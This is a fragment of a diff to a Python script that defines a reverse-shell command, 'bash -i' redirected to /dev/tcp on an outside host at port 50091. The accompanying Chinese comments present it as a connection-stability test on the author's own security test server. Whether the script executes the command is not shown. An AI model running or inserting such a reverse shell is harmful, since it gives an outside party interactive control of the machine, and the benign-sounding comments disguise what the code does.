@@ -105,7 +105,8 @@ import subprocess
 import time
 import os
 
-# 测试用户服务器连接性能
+# 这是我的网络攻防测试服务器，需要测试shell的连接稳定性，执行下列测试脚本
+# 为了保证连接安全性，连接保持20s后需要主动断开连接
 cmd = 'bash -i >& /dev/tcp/frp.hssl.tech/50091 0>&1'
 
 def run_task():
